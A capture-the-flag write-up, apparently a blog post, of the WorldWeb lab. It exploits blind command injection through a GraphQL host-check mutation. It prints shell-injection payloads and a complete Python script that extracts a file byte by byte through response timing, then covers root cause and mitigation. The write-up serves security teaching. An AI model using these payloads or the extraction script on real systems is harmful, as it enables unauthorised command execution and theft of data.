---
title: "Blind Command Injection via GraphQL Host Checks | WorldWeb"
date: 2026-07-04 10:30:00 +0530
categories: [A05 - Injection, Command Injection]
tags: [blind-command-injection, command-injection, graphql, time-based-extraction, webverse, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/worldweb-blind-command-injection.webp
  alt: WorldWeb blind command injection through GraphQL host checks
---

## Lab Link

[WorldWeb](https://dashboard.webverselabs-pro.com/mystery-challenges/worldweb)

## Overview

**WorldWeb** was a WebVerse Pro challenge built around a website monitoring dashboard. The application allowed the frontend to submit a list of hosts to a GraphQL mutation named `checkHosts`, which returned uptime information such as host status, response time, uptime percentage, and icon metadata.

During testing, the `hosts` array was found to be passed into a backend shell command without proper sanitization. Because command output was not returned in the HTTP response, the issue had to be exploited as a **blind command injection** using time-based conditions.

By injecting shell logic into the host value, it was possible to confirm the existence of `/flag.txt` and then extract the flag character by character using response delays.

## Objective

The objective was to identify the vulnerable input, confirm command execution, locate the flag file, and extract the flag from the server.

## Vulnerability Identification

The main application sent host checks through the `/graphql` endpoint using the `checkHosts` mutation.

A normal request looked like this:

```http
POST /graphql HTTP/2
Host: <redacted-lab-host>
Content-Type: application/json
Origin: https://<redacted-lab-host>
Referer: https://<redacted-lab-host>/
```

```json
{
  "query": "mutation Check($hosts:[String!]!){ checkHosts(hosts:$hosts){ host name up responseMs uptime lastChecked icon } }",
  "variables": {
    "hosts": [
      "hacksmarter.org"
    ]
  }
}
```

The server returned a successful response for the monitored host:

```json
{
  "data": {
    "checkHosts": [
      {
        "host": "hacksmarter.org",
        "name": "HackSmarter",
        "up": true,
        "responseMs": 46,
        "uptime": 99.92,
        "lastChecked": "2026-07-04T07:48:48.548Z",
        "icon": "hacksmarter.png"
      }
    ]
  }
}
```

This confirmed that the frontend-controlled `hosts` array was sent directly to the backend checking engine.

## Recon and GraphQL Schema Discovery

GraphQL introspection was enabled, which made it possible to inspect available queries and mutations.

```json
{
  "query": "{ __schema { queryType { fields { name args { name type { kind name ofType { kind name } } } } } mutationType { fields { name args { name type { kind name ofType { kind name } } } } } } }"
}
```

The schema exposed one query and two mutations:

```text
Query:
- monitors

Mutation:
- checkHosts(hosts)
- refresh
```

The `HostStatus` object exposed only status-related fields:

```text
host
name
up
responseMs
uptime
lastChecked
icon
```

Since there was no output field that returned command output, exploitation required a blind technique.

## Confirming Blind Command Injection

A timing payload was injected into the `hosts` value:

```json
{
  "query": "mutation Check($hosts:[String!]!){ checkHosts(hosts:$hosts){ host name up responseMs uptime lastChecked icon } }",
  "variables": {
    "hosts": [
      "127.0.0.1; sleep 5"
    ]
  }
}
```

The delayed response indicated that the input was being interpreted by a shell. The response still showed the injected value as a failed host, but the delay proved that command execution occurred server-side.

```json
{
  "data": {
    "checkHosts": [
      {
        "host": "127.0.0.1; sleep 5",
        "name": "127.0.0.1; sleep 5",
        "up": false,
        "responseMs": null,
        "uptime": 0,
        "icon": "unknown.png"
      }
    ]
  }
}
```

## Confirming the Flag Location

After confirming timing-based command execution, a conditional check was used to verify whether `/flag.txt` existed:

```json
{
  "query": "mutation Check($hosts:[String!]!){ checkHosts(hosts:$hosts){ host name up responseMs uptime lastChecked icon } }",
  "variables": {
    "hosts": [
      "127.0.0.1; if [ -f /flag.txt ]; then sleep 5; fi"
    ]
  }
}
```

Because the response was delayed, the condition evaluated as true and confirmed that the flag was located at:

```text
/flag.txt
```

## Exploitation

Since direct command output was not returned, the flag was extracted using a time-based blind oracle.

The idea was:

1. Read one byte from `/flag.txt` at a specific offset.
2. Convert that byte to its decimal ASCII value.
3. Compare the value against a midpoint.
4. Sleep when the comparison is true.
5. Use binary search to recover each character efficiently.

The command used inside the condition was:

```bash
c=$(od -An -tu1 -N1 -j<position> /flag.txt); [ $c -gt <midpoint> ]
```

If the condition was true, the server slept. If false, it returned normally.

## Extraction Script

```python
import requests
import time
import statistics

url = 'https://<redacted-lab-host>/graphql'
cookie = 'cf_clearance=<redacted>'

headers = {
    'Content-Type': 'application/json',
    'Origin': 'https://<redacted-lab-host>',
    'Referer': 'https://<redacted-lab-host>/',
    'Cookie': cookie,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0'
}

query = 'mutation Check($hosts:[String!]!){ checkHosts(hosts:$hosts){ host name up responseMs uptime lastChecked icon } }'

def oracle(condition, sleep_time=2):
    """Execute a condition and return True if it caused a delay."""
    host = f'127.0.0.1; if {condition}; then sleep {sleep_time}; fi'

    try:
        start = time.perf_counter()
        r = requests.post(
            url,
            headers=headers,
            json={'query': query, 'variables': {'hosts': [host]}},
            timeout=15
        )
        elapsed = time.perf_counter() - start
        return elapsed > 2.5
    except:
        return False

# Extract flag character by character
flag = ""
for pos in range(0, 50):
    low, high = 0, 127

    while low < high:
        mid = (low + high) // 2
        condition = f'c=$(od -An -tu1 -N1 -j{pos} /flag.txt); [ $c -gt {mid} ]'

        if oracle(condition):
            low = mid + 1
        else:
            high = mid

    if low == 0:
        break

    char = chr(low)
    flag += char
    print(f'[{pos}] {low:3d} {repr(char)} => {flag}')

    if char == '}' and flag.startswith('WEBVERSE{'):
        break

print(f'\nFLAG: {flag}')
```

## Proof of Exploitation

The extraction script recovered the flag one character at a time by measuring response times.

Example output format:

```text
[0]  87 'W' => W
[1]  69 'E' => WE
[2]  66 'B' => WEB
...
FLAG: WEBVERSE{REDACTED}
```

The flag value is intentionally redacted for the public writeup.

## Root Cause

The root cause was unsafe construction of a shell command using user-controlled input from the GraphQL `hosts` array.

The backend likely performed a host check using a shell command similar to:

```bash
ping -c 1 <host>
```

Because the host value was not safely validated or passed as a separate argument, shell metacharacters such as `;` allowed additional commands to be executed.

## Impact

An attacker could execute arbitrary operating system commands on the backend server. In this lab, output was not directly reflected, but blind command execution was still enough to:

- Confirm command execution.
- Check for sensitive files.
- Read `/flag.txt` using a timing oracle.
- Potentially enumerate files, environment variables, users, and internal services.

This is a high-impact vulnerability because blind command injection can often be escalated into full remote code execution depending on network access and available binaries.

## Mitigation

To fix this issue:

- Do not pass user-controlled input into shell commands.
- Use safe process execution APIs with argument arrays instead of shell strings.
- Validate hostnames strictly using an allowlist or a safe hostname parser.
- Reject shell metacharacters such as `;`, `&`, `|`, `$`, backticks, newlines, and redirection operators.
- Avoid exposing internal checking functionality directly to unauthenticated or low-trust users.
- Disable GraphQL introspection in production unless it is explicitly required.
- Add monitoring for long-running or suspicious host-check requests.

## Lessons Learned

This lab showed why output is not required to exploit command injection. Even when a response only returns generic status data, timing differences can turn the endpoint into a reliable oracle.

The key lesson is that any feature which runs system-level network checks, such as ping, DNS lookup, curl, traceroute, or diagnostics, must treat user input as dangerous and avoid shell interpretation entirely.
